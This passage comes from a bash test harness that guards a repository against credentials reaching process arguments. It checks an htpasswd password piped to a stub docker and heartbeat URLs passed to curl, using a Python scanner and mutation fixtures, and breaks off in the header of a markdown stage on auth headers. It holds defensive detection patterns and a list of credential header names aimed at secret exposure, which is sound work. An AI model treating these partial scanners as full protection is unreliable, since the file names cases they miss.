if s6_step_ok "$S6/row-good"; then row "S6 executable: the REAL rehearsal step, run under bash -eo pipefail against the refusing stub docker, makes exactly one call (7 words, -i, -Bin <user>), nothing is refused, the password (by hash) arrived on stdin and the htpasswd file holds the entry" ok
else row "S6 executable: the real rehearsal step did not make the one accepted stdin-form call" fail "rc=$S6_RUN_RC refusals=$(s6_nrefusals "$S6/row-good") argc=$(cat "$S6/row-good/log/argc" 2>/dev/null) stderr=$(head -c 160 "$S6/row-good/stderr" | tr '\n' ' ')"; fi
# Mutations of the step text itself: drop docker's -i; put -b back (the original argv form).
cp "$S6_STEP" "$S6/step-noi.sh"; cp "$S6_STEP" "$S6/step-b.sh"
if s6_edit "$S6/step-noi.sh" 'docker run --rm -i httpd:2.4-alpine' 'docker run --rm httpd:2.4-alpine'; then
  s6_run_step "$S6/step-noi.sh" "$S6/row-noi"
  if [[ "$S6_RUN_RC" -ne 0 && "$(s6_nrefusals "$S6/row-noi")" -ge 1 ]] && ! s6_step_ok "$S6/row-noi"; then row "S6 mutation (executable): dropping docker's own -i from the step is RED (the stub refuses: docker would forward nothing and the hash would cover an empty password)" ok
  else row "S6 mutation (executable): the step without docker -i is not caught" fail "rc=$S6_RUN_RC refusals=$(s6_nrefusals "$S6/row-noi")"; fi
else row "S6 mutation (executable): the -i drop did not land on the step text (the step is not the stdin form)" fail "no 'docker run --rm -i httpd:2.4-alpine' once in the extracted step"; fi
if s6_edit "$S6/step-b.sh" "printf '%s' \"\$RP\" | docker run --rm -i httpd:2.4-alpine htpasswd -Bin \"\$RU\"" 'docker run --rm httpd:2.4-alpine htpasswd -Bbn "$RU" "$RP"'; then
  s6_run_step "$S6/step-b.sh" "$S6/row-b"
  if [[ "$S6_RUN_RC" -ne 0 && "$(s6_nrefusals "$S6/row-b")" -ge 1 ]] && ! s6_step_ok "$S6/row-b"; then row "S6 mutation (executable): putting -b back (the original password-on-argv call) is RED (the stub refuses anything but the stdin form)" ok
  else row "S6 mutation (executable): the step with -b back is not caught" fail "rc=$S6_RUN_RC refusals=$(s6_nrefusals "$S6/row-b")"; fi
else row "S6 mutation (executable): the -b edit did not land on the step text (the step is not the stdin form)" fail "the printf-piped docker call was not found once in the extracted step"; fi
echo "=== stage S6: Guard 3 rows (htpasswd password off argv: workflow site, residual allowlist, executable stub) done ==="

# =====================================================================================
# STAGE S6-HB (argv-bearer sweep, Guard 2, #9757): a heartbeat URL reaches curl only on the stdin config, after the shape judgement.
#
# PROPERTY. A Better Stack heartbeat URL's PATH is the credential. In the converted host scripts it is never an argument of any process: it rides curl's
# stdin config (`--config -`), after a shape guard that refuses (zero requests, one value-free marker) a scheme other than https://, an empty rest and any
# byte outside [A-Za-z0-9._~:/?&=%+-]. The behavioural rows (hostile values, per-attempt stdin, zero requests, zero sleeps, the dash run) live in the
# scripts' own suites (luks-monitor.test.sh, web-git-data-probe.test.sh, inngest.test.sh); this stage owns the DERIVED POPULATION.
#
# DERIVATION. Every tracked-or-untracked apps/web-platform/infra/*.sh (not *.test.sh) whose non-comment code mentions `heartbeat` is a heartbeat script (a
# file that names no heartbeat, e.g. a Pages probe whose own variable is also called URL, is outside the population). In such a file every logical line
# (continuations joined, whole-line comments dropped) has its `< <(...)` stdin feed removed, is split into segments on `||`, `&&`, `;` and `|`, and every
# segment holding a `curl` command word whose remaining text names `$URL`, `$hb_url` or a `*HEARTBEAT_URL` variable is a VIOLATION: the URL is on argv.
# (`$INNGEST_HEALTH_URL`, the local health probe in the same file as the heartbeat, is not a heartbeat variable.) The curl word may carry a path prefix
# (`/usr/local/bin/curl`), a leading backslash (`\curl`) or a backtick. NOT COVERED, named (a text heuristic, not exhaustive; these pre-date PR C, see ADR-280 PR C
# follow-up): a URL carried in a variable that is none of those names, an `eval`, curl inside a quoted string, producer and consumer split across segments,
# other HTTP clients, a quoted metacharacter before the URL, files in subdirectories or not named *.sh, and units. The registry template's own heartbeat curls
# are S6-REG's (above).
#
# EXPLICIT RESIDUAL ALLOWLIST (S6H_ALLOW: file, the segment text, the exact number of occurrences): EMPTY since PR C (#10120 converted the inngest heartbeat
# body, #10093 the three probe scripts), so every heartbeat curl carries its URL on stdin and any argv URL is a plain violation. The mechanism stays: an entry
# the scan no longer sees, or a count that moved, is RED, and the ceiling is 0 (a grown allowlist is RED by the same predicate).
# CONVERTED SCRIPTS (S6H_CONVERTED): exactly one stdin config line (`url = "..."`) each, and exactly one copy of the shape-guard class, on a line BEFORE it.
# =====================================================================================
S6H_DIR="apps/web-platform/infra"
S6H_CONVERTED=(luks-monitor.sh web-git-data-probe.sh inngest-bootstrap.sh web-zot-consumer-probe.sh inngest-consumer-probe.sh web-private-nic-guard.sh)
S6H_FILE_FLOOR=7
S6H_ALLOW_CEIL=0
S6H_CLASS='[!A-Za-z0-9._~:/?\&=%+-]'
S6H_ALLOW=()
# One TSV record per finding. V: a violating segment (file, segment). C: a stdin config line (file, line number). G: a guard class literal (file, line
# number). P: a heartbeat-population file (file).
s6h_scan() { # <root>
  python3 -I -c '
import re, subprocess, sys
root = sys.argv[1]
files = subprocess.run(["git", "-C", root, "ls-files", "-z", "--cached", "--others", "--exclude-standard"], capture_output=True, check=True).stdout.decode().split("\0")
pat = re.compile(r"^apps/web-platform/infra/[^/]+\.sh$")
cmd = re.compile(r"(?:^|[\s({;|&`\\])(?:/(?:[A-Za-z0-9_.-]+/)*)?curl(?=\s|$)")
var = re.compile(r"\$\{?(?:URL|hb_url|[A-Z0-9_]*HEARTBEAT_URL)(?![A-Za-z0-9_])")
cfg = re.compile(r"url = \"(?:%s|\$\{?[A-Za-z_]*HEARTBEAT_URL)")
cls = sys.argv[2]
for f in sorted(set(files)):
    if not pat.match(f) or f.endswith(".test.sh"): continue
    try: raw = open(root + "/" + f, encoding="utf-8", errors="replace").read().split("\n")
    except OSError: continue
    logical, cur, start = [], "", 0
    for i, l in enumerate(raw, 1):
        s = l.strip()
        if not cur and s.startswith("#"): continue
        if not cur: start = i
        if s.endswith("\\"): cur += s[:-1] + " "; continue
        logical.append((start, cur + s)); cur = ""
    if cur: logical.append((start, cur))
    if not any(re.search(r"heartbeat", t, re.I) for _, t in logical): continue
    print("P\t" + f)
    for n, t in logical:
        if cfg.search(t): print("C\t%s\t%d" % (f, n))
        if cls in t: print("G\t%s\t%d" % (f, n))
        u = re.sub(r"<\s*<\(.*?\)", "", t)
        for seg in re.split(r"\s*(?:\|\||&&|;|\|)\s*", u):
            seg = " ".join(seg.split())
            if cmd.search(seg) and var.search(seg): print("V\t%s\t%s" % (f, seg))
' "$1" "$S6H_CLASS"
}
# The verdict over a root. Sets S6H_J_REASONS (empty = GREEN) and S6H_J_FILES. Reasons: floor, argv:<file>, stale-allowlist, cfg:<file>, guard:<file>.
S6H_J_REASONS=""; S6H_J_FILES=0
s6h_judge() { # <root>
  local root="$1" scan a file seg want got c g cl gl f
  scan="$(s6h_scan "$root")"; S6H_J_REASONS=""
  S6H_J_FILES="$(grep -c '^P	' <<<"$scan" || true)"
  [[ "$S6H_J_FILES" -ge "$S6H_FILE_FLOOR" ]] || S6H_J_REASONS+=" floor"
  # every violating (file, segment) must be allowlisted with exactly its count
  while IFS=$'\t' read -r got file seg; do
    [[ -n "$file" ]] || continue
    want=""; for a in "${S6H_ALLOW[@]}"; do [[ "$a" == "$file"$'\t'"$seg"$'\t'* ]] && want="${a##*$'\t'}"; done
    [[ "$want" == "$got" ]] || S6H_J_REASONS+=" argv:$file"
  done < <(awk -F'\t' '$1 == "V" { k = $2 "\t" $3; n[k]++ } END { for (k in n) print n[k] "\t" k }' <<<"$scan")
  for a in "${S6H_ALLOW[@]}"; do
    file="${a%%$'\t'*}"; seg="${a#*$'\t'}"; seg="${seg%$'\t'*}"; want="${a##*$'\t'}"
    got="$(awk -F'\t' -v f="$file" -v s="$seg" '$1 == "V" && $2 == f && $3 == s { n++ } END { print n + 0 }' <<<"$scan")"
    [[ "$got" == "$want" ]] || S6H_J_REASONS+=" stale-allowlist"
  done
  for f in "${S6H_CONVERTED[@]}"; do
    file="$S6H_DIR/$f"
    c="$(awk -F'\t' -v f="$file" '$1 == "C" && $2 == f { n++ } END { print n + 0 }' <<<"$scan")"
    cl="$(awk -F'\t' -v f="$file" '$1 == "C" && $2 == f { print $3; exit }' <<<"$scan")"
    g="$(awk -F'\t' -v f="$file" '$1 == "G" && $2 == f { n++ } END { print n + 0 }' <<<"$scan")"
    gl="$(awk -F'\t' -v f="$file" '$1 == "G" && $2 == f { print $3; exit }' <<<"$scan")"
    [[ "$c" == 1 ]] || S6H_J_REASONS+=" cfg:$file"
    [[ "$g" == 1 && -n "$gl" && -n "$cl" && "$gl" -lt "$cl" ]] || S6H_J_REASONS+=" guard:$file"
  done
  S6H_J_REASONS="${S6H_J_REASONS# }"
}
S6H="$TMPD/s6h"; assert_fixture_dir "$S6H"; mkdir -p "$S6H/base" "$S6H/mut"
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$S6H/base" || exit 1; git -C "$S6H/base" init -q ) \
  || fatal "S6-HB could not create the scratch repository"
mkdir -p "$S6H/base/$S6H_DIR"
# The scratch tree holds every converted script the real verdict names, plus two controls: a non-heartbeat probe whose own variable is also called URL (outside the
# population: it must NOT be flagged) and the already-converted git-data-liveness.sh (a stdin-form heartbeat script that is not in S6H_CONVERTED).
for f in "${S6H_CONVERTED[@]}" pages-build-identity-probe.sh git-data-liveness.sh; do
  cp "$REPO_ROOT/$S6H_DIR/$f" "$S6H/base/$S6H_DIR/$f"
done
s6h_fresh() { local d="$S6H/mut/$1"; assert_fixture_dir "$d"; rm -rf "$d"; cp -a "$S6H/base" "$d" && printf '%s' "$d"; }

# --- the real tree ---------------------------------------------------------------------
s6h_judge "$REPO_ROOT"; S6H_REAL_REASONS="$S6H_J_REASONS"; S6H_REAL_FILES="$S6H_J_FILES"
if [[ -z "$S6H_REAL_REASONS" ]]; then row "S6-HB Guard 2: no heartbeat curl in apps/web-platform/infra/*.sh carries its URL on argv outside the residual allowlist, and each converted script has exactly one guarded stdin config line ($S6H_REAL_FILES heartbeat scripts derived)" ok
else row "S6-HB Guard 2: a heartbeat URL is on curl argv outside the residual allowlist, an allowlist entry is stale, or a converted script lost its guarded stdin config line" fail "reasons='$S6H_REAL_REASONS' files=$S6H_REAL_FILES"; fi
S6H_SCAN="$(s6h_scan "$REPO_ROOT")"
s6h_ncfg() { awk -F'\t' -v f="$S6H_DIR/$1" '$1 == "C" && $2 == f { n++ } END { print n + 0 }' <<<"$S6H_SCAN"; }
s6h_inpop() { awk -F'\t' -v f="$S6H_DIR/$1" '$1 == "P" && $2 == f { n++ } END { print n + 0 }' <<<"$S6H_SCAN"; }
for f in "${S6H_CONVERTED[@]}"; do
  if [[ "$(s6h_ncfg "$f")" -eq 1 && "$(s6h_inpop "$f")" -eq 1 ]]; then row "S6-HB converted $f: in the derived heartbeat population, exactly one stdin config line (the single guarded transport), no violating segment" ok
  else row "S6-HB converted $f: not in the population, or not exactly one stdin config line" fail "cfg=$(s6h_ncfg "$f") inpop=$(s6h_inpop "$f")"; fi
done
S6H_ALLOW_FILES="$(for a in "${S6H_ALLOW[@]}"; do printf '%s\n' "${a%%$'\t'*}"; done | sort -u | grep -c . || true)"
s6h_ceiling_ok() { [[ "$1" -eq "$S6H_ALLOW_CEIL" && "$S6H_ALLOW_CEIL" -eq 0 ]]; }
if s6h_ceiling_ok "${#S6H_ALLOW[@]}" && ! s6h_ceiling_ok $((${#S6H_ALLOW[@]} + 1)); then row "S6-HB allowlist ceiling: the residual allowlist is EMPTY (ceiling $S6H_ALLOW_CEIL; PR C deleted the four residual entries of #10120 and #10093), and a grow-by-one allowlist is judged RED by the same predicate" ok
else row "S6-HB allowlist ceiling: the residual allowlist is not empty, or the ceiling predicate accepts a grown allowlist" fail "entries=${#S6H_ALLOW[@]} files=$S6H_ALLOW_FILES want=$S6H_ALLOW_CEIL"; fi

# --- mutation rows (the SAME scan over a scratch tree) ------------------------------------
# M1 (Guard 2 row 1): the URL back on argv in a converted script.
S6H_M1="$(s6h_fresh m1)"
if s6_edit "$S6H_M1/$S6H_DIR/web-git-data-probe.sh" '--config - 2>/dev/null < <(printf '"'"'url = "%s"\n'"'"' "$URL"); }' '"$URL" 2>/dev/null; }'; then
  s6h_judge "$S6H_M1"
  if [[ "$S6H_J_REASONS" == *"argv:$S6H_DIR/web-git-data-probe.sh"* && "$S6H_J_REASONS" == *"cfg:$S6H_DIR/web-git-data-probe.sh"* ]]; then row "S6-HB mutation 1: the URL back on curl argv in a converted script is RED (an argv violation, and the script's stdin config line is gone)" ok
  else row "S6-HB mutation 1: an argv heartbeat URL in a converted script is not caught" fail "reasons='$S6H_J_REASONS'"; fi
else row "S6-HB mutation 1: the argv edit did not land (re-anchor with web-git-data-probe.sh)" fail "no transport line once in the scratch copy"; fi
# Guard-copy parity (Guard 2): the shape guard and the per-attempt curl are four byte-identical inline copies (checkout-less hosts cannot source a library), so
# one drift between them is a silent fork of the credential gate. Extract both definitions from each bash copy and require ONE distinct digest.
s6h_guard_digest() { # <file> -> md5 of the _hb_url_ok function and the _hb_curl line, empty when either is missing
  python3 -I -c '
import hashlib, sys
src = open(sys.argv[1], encoding="utf-8", errors="replace").read().split("\n")
out, i = [], 0
while i < len(src):
    if src[i].startswith("_hb_url_ok() {"):
        j = i
        while j < len(src) and src[j] != "}": j += 1
        out.extend(src[i:j + 1]); i = j
    elif src[i].startswith("_hb_curl() {"):
        out.append(src[i])
    i += 1
if len([l for l in out if l.startswith("_hb_url_ok() {")]) != 1 or len([l for l in out if l.startswith("_hb_curl() {")]) != 1: sys.exit(0)
print(hashlib.md5("\n".join(out).encode()).hexdigest())
' "$1"
}
S6H_PARITY_FILES=(web-git-data-probe.sh web-zot-consumer-probe.sh inngest-consumer-probe.sh web-private-nic-guard.sh)
S6H_PARITY_SET=""; S6H_PARITY_EMPTY=0
for f in "${S6H_PARITY_FILES[@]}"; do
  S6H_D="$(s6h_guard_digest "$REPO_ROOT/$S6H_DIR/$f")"
  if [[ -z "$S6H_D" ]]; then S6H_PARITY_EMPTY=$((S6H_PARITY_EMPTY + 1)); else S6H_PARITY_SET+="$S6H_D"$'\n'; fi
done
S6H_PARITY_N="$(printf '%s' "$S6H_PARITY_SET" | sort -u | grep -c . || true)"
if [[ "$S6H_PARITY_EMPTY" -eq 0 && "$S6H_PARITY_N" -eq 1 ]]; then row "S6-HB guard-copy parity: _hb_url_ok and _hb_curl are byte-identical across the ${#S6H_PARITY_FILES[@]} bash copies (one digest, none missing a definition)" ok
else row "S6-HB guard-copy parity: the inline guard copies drifted or one lost a definition" fail "distinct=$S6H_PARITY_N missing=$S6H_PARITY_EMPTY"; fi
S6H_MPA="$(s6h_fresh mpa)"
if s6_edit "$S6H_MPA/$S6H_DIR/web-zot-consumer-probe.sh" '  case "$1" in https://*) ;; *) return 1 ;; esac' '  case "$1" in http*://*) ;; *) return 1 ;; esac'; then
  S6H_DA="$(s6h_guard_digest "$S6H_MPA/$S6H_DIR/web-zot-consumer-probe.sh")"; S6H_DB="$(s6h_guard_digest "$S6H_MPA/$S6H_DIR/web-git-data-probe.sh")"
  if [[ -n "$S6H_DA" && -n "$S6H_DB" && "$S6H_DA" != "$S6H_DB" ]]; then row "S6-HB guard-copy parity mutation: loosening the scheme test in ONE copy changes its digest (the parity row would be RED)" ok
  else row "S6-HB guard-copy parity mutation: a one-copy edit of the guard is not visible to the digest" fail "a=$S6H_DA b=$S6H_DB"; fi
else row "S6-HB guard-copy parity mutation: the edit did not land (re-anchor with the scheme case line)" fail "no scheme case line once in the scratch copy"; fi
# M-var/M-curl (scanner reach, CTO-ruled 2026-10-15): the stage contract says *HEARTBEAT_URL, which includes the bare name, and the curl word may be path-prefixed,
# backslashed or inside backticks. Each spelling is appended to a converted script (no allowlist to hide behind) and must be an argv violation.
S6H_MV="$(s6h_fresh mv)"; assert_fixture_dir "$S6H_MV"; printf '%s\n' 'curl -fsS "$HEARTBEAT_URL" >/dev/null' >> "$S6H_MV/$S6H_DIR/luks-monitor.sh"
s6h_judge "$S6H_MV"
if [[ "$S6H_J_REASONS" == *"argv:$S6H_DIR/luks-monitor.sh"* ]]; then row "S6-HB scanner reach: a curl carrying the bare \$HEARTBEAT_URL (the stage contract's *HEARTBEAT_URL includes it) is an argv violation" ok
else row "S6-HB scanner reach: the bare HEARTBEAT_URL variable is not matched" fail "reasons='$S6H_J_REASONS'"; fi
S6H_MC_BAD=""; S6H_MC_I=0
for S6H_SP in '/usr/local/bin/curl -fsS "$URL" >/dev/null' '\curl -fsS "$URL" >/dev/null' 'x=`curl -fsS "$URL"`'; do
  S6H_MC_I=$((S6H_MC_I + 1)); S6H_MC="$(s6h_fresh "mc$S6H_MC_I")"; assert_fixture_dir "$S6H_MC"; printf '%s\n' "$S6H_SP" >> "$S6H_MC/$S6H_DIR/luks-monitor.sh"
  s6h_judge "$S6H_MC"; [[ "$S6H_J_REASONS" == *"argv:$S6H_DIR/luks-monitor.sh"* ]] || S6H_MC_BAD+=" [$S6H_SP]"
done
if [[ -z "$S6H_MC_BAD" ]]; then row "S6-HB scanner reach: a path-prefixed curl, a backslashed curl and a backtick-substituted curl carrying \$URL are each an argv violation" ok
else row "S6-HB scanner reach: a curl spelling is not matched" fail "missed:$S6H_MC_BAD"; fi
# M1b (Guard 2 row 1, the POSIX heredoc script): the URL back on argv in the heartbeat-body curl. The mutant is built from the real transport line.
S6H_M1B="$(s6h_fresh m1b)"
if s6_edit "$S6H_M1B/$S6H_DIR/inngest-bootstrap.sh" 'printf '"'"'url = "%s"\n'"'"' "$INNGEST_HEARTBEAT_URL" | /usr/bin/curl --disable --noproxy '"'"'*'"'"' -gfsS --max-time 10 --config - >/dev/null' '/usr/bin/curl --disable --noproxy '"'"'*'"'"' -gfsS --max-time 10 "$INNGEST_HEARTBEAT_URL" >/dev/null'; then
  s6h_judge "$S6H_M1B"
  if [[ "$S6H_J_REASONS" == *"argv:$S6H_DIR/inngest-bootstrap.sh"* && "$S6H_J_REASONS" == *"cfg:$S6H_DIR/inngest-bootstrap.sh"* ]]; then row "S6-HB mutation 1 (POSIX sh script): the URL back on curl argv in the inngest heartbeat body is RED (an argv violation, and its stdin config line is gone)" ok
  else row "S6-HB mutation 1 (POSIX sh script): an argv heartbeat URL in the inngest heartbeat body is not caught" fail "reasons='$S6H_J_REASONS'"; fi
else row "S6-HB mutation 1 (POSIX sh script): the argv edit did not land (re-anchor with the printf-piped curl line in inngest-bootstrap.sh)" fail "no printf-piped curl transport line once in the scratch copy"; fi
# M1c (Guard 2 row 1, the three probes): the URL back on argv in each probe's per-attempt curl, one scratch copy per probe.
S6H_M1C_BAD=""
for S6H_PF in web-zot-consumer-probe.sh inngest-consumer-probe.sh web-private-nic-guard.sh; do
  S6H_M1C="$(s6h_fresh "m1c-${S6H_PF%.sh}")"
  if s6_edit "$S6H_M1C/$S6H_DIR/$S6H_PF" '--config - 2>/dev/null < <(printf '"'"'url = "%s"\n'"'"' "$URL"); }' '"$URL" 2>/dev/null; }'; then
    s6h_judge "$S6H_M1C"
    [[ "$S6H_J_REASONS" == *"argv:$S6H_DIR/$S6H_PF"* && "$S6H_J_REASONS" == *"cfg:$S6H_DIR/$S6H_PF"* ]] || S6H_M1C_BAD+=" $S6H_PF(reasons=$S6H_J_REASONS)"
  else S6H_M1C_BAD+=" $S6H_PF(edit-missed)"; fi
done
if [[ -z "$S6H_M1C_BAD" ]]; then row "S6-HB mutation 1 (the three probes): the URL back on curl argv in the web-zot-consumer, inngest-consumer or private-NIC probe is RED (an argv violation, and its stdin config line is gone)" ok
else row "S6-HB mutation 1 (the three probes): an argv heartbeat URL in a converted probe is not caught, or the edit did not land" fail "bad='$S6H_M1C_BAD'"; fi
# M3 (Guard 2 row 3): a second heartbeat curl outside the guarded line after a compliant first. Both spellings: URL on argv, and an unguarded second stdin config line.
S6H_M3="$(s6h_fresh m3)"; assert_fixture_dir "$S6H_M3"; printf '%s\n' '[ -n "$hb_url" ] && curl -fsS "$hb_url" >/dev/null 2>&1' >> "$S6H_M3/$S6H_DIR/luks-monitor.sh"
s6h_judge "$S6H_M3"; S6H_M3A="$S6H_J_REASONS"
S6H_M3B="$(s6h_fresh m3b)"; assert_fixture_dir "$S6H_M3B"; printf '%s\n' "curl --disable --noproxy '*' -gfsS --config - >/dev/null < <(printf 'url = \"%s\"\\n' \"\$hb_url\")" >> "$S6H_M3B/$S6H_DIR/luks-monitor.sh"
s6h_judge "$S6H_M3B"; S6H_M3BR="$S6H_J_REASONS"
if [[ "$S6H_M3A" == *"argv:$S6H_DIR/luks-monitor.sh"* && "$S6H_M3BR" == *"cfg:$S6H_DIR/luks-monitor.sh"* ]]; then row "S6-HB mutation 3: a second heartbeat curl after the compliant one is RED, both as an argv URL and as a second (unguarded) stdin config line" ok
else row "S6-HB mutation 3: a second heartbeat curl in a converted script is not caught" fail "argv='$S6H_M3A' cfg='$S6H_M3BR'"; fi
# M-guard: the shape-guard class altered or missing in a converted script.
# M3c (Guard 2 row 3, a probe): a second heartbeat curl after the compliant first. Both spellings: URL on argv, and an unguarded second stdin config line.
S6H_M3C="$(s6h_fresh m3c)"; assert_fixture_dir "$S6H_M3C"; printf '%s\n' '[ -n "$URL" ] && curl -fsS -m 10 -o /dev/null "$URL" 2>/dev/null' >> "$S6H_M3C/$S6H_DIR/web-private-nic-guard.sh"
s6h_judge "$S6H_M3C"; S6H_M3CA="$S6H_J_REASONS"
S6H_M3D="$(s6h_fresh m3d)"; assert_fixture_dir "$S6H_M3D"; printf '%s\n' "curl --disable --noproxy '*' -gfsS --config - >/dev/null < <(printf 'url = \"%s\"\\n' \"\$URL\")" >> "$S6H_M3D/$S6H_DIR/web-private-nic-guard.sh"
s6h_judge "$S6H_M3D"; S6H_M3DR="$S6H_J_REASONS"
if [[ "$S6H_M3CA" == *"argv:$S6H_DIR/web-private-nic-guard.sh"* && "$S6H_M3DR" == *"cfg:$S6H_DIR/web-private-nic-guard.sh"* ]]; then row "S6-HB mutation 3 (a probe): a second heartbeat curl after the compliant first is RED, both as an argv URL and as a second unguarded stdin config line" ok
else row "S6-HB mutation 3 (a probe): a second heartbeat curl in a converted probe is not caught" fail "argv='$S6H_M3CA' cfg='$S6H_M3DR'"; fi
# MGb (Guard 2 row 3, the POSIX script): any edit of the shape-guard class literal in inngest-bootstrap.sh is RED by identity. The dangerous direction (a class that
# ADMITS a quote) is caught only by the runtime hostile-value rows of inngest.test.sh, not by this identity check.
S6H_MGB="$(s6h_fresh mgb)"
if s6_edit "$S6H_MGB/$S6H_DIR/inngest-bootstrap.sh" "$S6H_CLASS" '[!A-Za-z0-9]'; then s6h_judge "$S6H_MGB"; S6H_MGBR="$S6H_J_REASONS"; else S6H_MGBR="edit-missed"; fi
if [[ "$S6H_MGBR" == *"guard:$S6H_DIR/inngest-bootstrap.sh"* ]]; then row "S6-HB mutation (guard, POSIX sh script): an altered shape-guard class in inngest-bootstrap.sh is RED" ok
else row "S6-HB mutation (guard, POSIX sh script): an altered shape-guard class in inngest-bootstrap.sh is not caught" fail "reasons='$S6H_MGBR'"; fi
S6H_MG="$(s6h_fresh mg)"
if s6_edit "$S6H_MG/$S6H_DIR/luks-monitor.sh" "$S6H_CLASS" '[!A-Za-z0-9]'; then s6h_judge "$S6H_MG"; S6H_MGR="$S6H_J_REASONS"; else S6H_MGR="edit-missed"; fi
if [[ "$S6H_MGR" == *"guard:$S6H_DIR/luks-monitor.sh"* ]]; then row "S6-HB mutation (guard): a converted script without the exact shape-guard class is RED" ok
else row "S6-HB mutation (guard): a missing or altered shape-guard class is not caught" fail "reasons='$S6H_MGR'"; fi
# M-stale: an allowlist entry that the scan does not see is RED (and nothing else). The real allowlist is empty, so the mutant INJECTS an entry for a
# converted script whose line is gone (the retired argv beat line of the NIC guard); the array is saved and restored around the judge call (as stage S6 does).
S6H_MS="$(s6h_fresh ms)"
S6H_ALLOW_SAVE=("${S6H_ALLOW[@]}")
S6H_ALLOW+=("$S6H_DIR/web-private-nic-guard.sh	beat() { curl --disable --noproxy '*' -fsS -m 10 -o /dev/null \"\$URL\" 2>/dev/null	1")
s6h_judge "$S6H_MS"; S6H_MS_R="$S6H_J_REASONS"
S6H_ALLOW=("${S6H_ALLOW_SAVE[@]}")
if [[ "$S6H_MS_R" == "stale-allowlist" ]]; then row "S6-HB mutation (stale): an allowlist entry for an already-converted script is RED (stale-allowlist, and nothing else)" ok
else row "S6-HB mutation (stale): a stale allowlist entry is not (only) reported" fail "reasons='$S6H_MS_R'"; fi
# M-grow: a new argv heartbeat curl in a new file, and one in a converted probe script (the allowlist is empty, so any argv URL is a violation).
S6H_MN="$(s6h_fresh mn)"; assert_fixture_dir "$S6H_MN"; printf '%s\n' 'NOTE=heartbeat' 'curl -fsS "$HB_HEARTBEAT_URL" >/dev/null' > "$S6H_MN/$S6H_DIR/zz-new-heartbeat.sh"
s6h_judge "$S6H_MN"; S6H_MNA="$S6H_J_REASONS"
S6H_MN2="$(s6h_fresh mn2)"; assert_fixture_dir "$S6H_MN2"; printf '%s\n' '  curl -fsS -m 10 -o /dev/null "$URL" 2>/dev/null' >> "$S6H_MN2/$S6H_DIR/web-zot-consumer-probe.sh"
s6h_judge "$S6H_MN2"; S6H_MNB="$S6H_J_REASONS"
if [[ "$S6H_MNA" == *"argv:$S6H_DIR/zz-new-heartbeat.sh"* && "$S6H_MNB" == *"argv:$S6H_DIR/web-zot-consumer-probe.sh"* ]]; then row "S6-HB mutation (growth): a new heartbeat script with its URL on argv is RED, and so is a violating curl appended to a converted probe (no allowlist to hide behind)" ok
else row "S6-HB mutation (growth): the residual allowlist can grow silently" fail "new='$S6H_MNA' extra='$S6H_MNB'"; fi
# M-floor: the scanned population renamed away: 0 heartbeat scripts must be RED, never a clean bill.
S6H_MF="$(s6h_fresh mf)"; sed -i -E 's/[Hh][Ee][Aa][Rr][Tt][Bb][Ee][Aa][Tt]/hrtbt/g' "$S6H_MF/$S6H_DIR"/*.sh
s6h_judge "$S6H_MF"
if [[ "$S6H_J_FILES" -eq 0 && "$S6H_J_REASONS" == *floor* ]]; then row "S6-HB mutation (floor): with every heartbeat word renamed the scan sees 0 scripts and the floor is RED" ok
else row "S6-HB mutation (floor): a scan that sees nothing is not RED" fail "files=$S6H_J_FILES reasons='$S6H_J_REASONS'"; fi
# Must-PASS (Guard 2 row 8, population half): the control probes. A non-heartbeat probe whose variable is also named URL is outside the population; the
# local health curl next to a heartbeat is not a heartbeat variable. The unmodified scratch tree is GREEN first (so the controls are the only change).
s6h_judge "$S6H/base"; S6H_BASE_REASONS="$S6H_J_REASONS"; S6H_BASE_FILES="$S6H_J_FILES"
S6H_MP="$(s6h_fresh mp)"; assert_fixture_dir "$S6H_MP"
printf '%s\n' 'NOTE=heartbeat' 'INNGEST_HEALTH_URL="${X:-http://127.0.0.1:8288/health}"' 'curl -fsS "$INNGEST_HEALTH_URL" >/dev/null' > "$S6H_MP/$S6H_DIR/zz-health-next-to-heartbeat.sh"
printf '%s\n' 'URL="${PROBE_URL:?}"' 'curl -sS --max-time 20 "$URL" >/dev/null' > "$S6H_MP/$S6H_DIR/zz-plain-url-probe.sh"
s6h_judge "$S6H_MP"
if [[ -z "$S6H_BASE_REASONS" && -z "$S6H_J_REASONS" && "$S6H_J_FILES" -eq $((S6H_BASE_FILES + 1)) ]]; then row "S6-HB must-pass: a local health curl beside a heartbeat, and a non-heartbeat probe whose variable is also named URL, are GREEN (only the first joins the population)" ok
else row "S6-HB must-pass: a control probe is flagged, or the population moved unexpectedly" fail "base='$S6H_BASE_REASONS' reasons='$S6H_J_REASONS' files=$S6H_J_FILES base_files=$S6H_BASE_FILES"; fi
echo "=== stage S6-HB: Guard 2 rows (heartbeat URL off curl argv: derived population, residual allowlist, converted-script identity) done ==="

# =====================================================================================
# STAGE S7 (argv-bearer sweep, Guard 3 for markdown, #10093): no tracked agent-run markdown teaches a bearer, apikey or webhook-signature header on curl argv.
#
# PROPERTY. No tracked `plugins/**/*.md` carries a `curl` command word together with a `-H`/`--header` whose header name is one of NINE names, outside
# the residual allowlist: Authorization, apikey, X-Api-Key, Private-Token, Api-Key, plus the four more that Rule E of
# scripts/lint-shell-trace-credential-refusal.py names (CF-Access-Client-Id, CF-Access-Client-Secret, X-Signature-256, X-Soleur-KB-Drift-Signature).
# An agent copies a snippet verbatim, and argv shows in /proc/<pid>/cmdline; the compliant form puts the header on curl's stdin config (`--config -`).
# Rule E does not read markdown, so for the nine names in plugin markdown this stage is the only recurrence guard.
#
# SCOPE, STATED PLAINLY. S7 is the guard for those nine header names, on a curl command word, in `plugins/**/*.md`, and for nothing wider. A green S7 does
# NOT mean "no secret reaches argv anywhere in the repo or in anything an agent reads". The classes below are outside it.
#
# DERIVATION. ONE scan over `git ls-files` (tracked and untracked) `plugins/**/*.md`, excluding the plugin docs site (plugins/soleur/docs/) and any
# `knowledge-base/` tree (an exclusion of convenience, NOT a claim that those files are history: see NOT COVERED). It runs over LOGICAL lines: backslash
# continuations are joined (the `-H` is usually on the second line) and the join STOPS at a code-fence boundary (a continuation ending a line before the
# closing fence is flushed, never glued to the prose after it). A table cell is one physical line and is never split on pipe, semicolon or
# double-ampersand. Matches are pattern-anchored, not line-anchored: `-H`, `--header`, `--header=`, `-H"Authorization` with no space, `-H $'Authorization`
# and `-H $"Authorization` (ANSI-C and locale quoting), a lowercase header name, a short-option cluster ending in H. The curl command word is `curl`,
# `/usr/bin/curl`, `/usr/local/bin/curl`, `./curl` or `\curl`. A `curl` command word must be present, so prose that names `-H` without it, the argv-safe
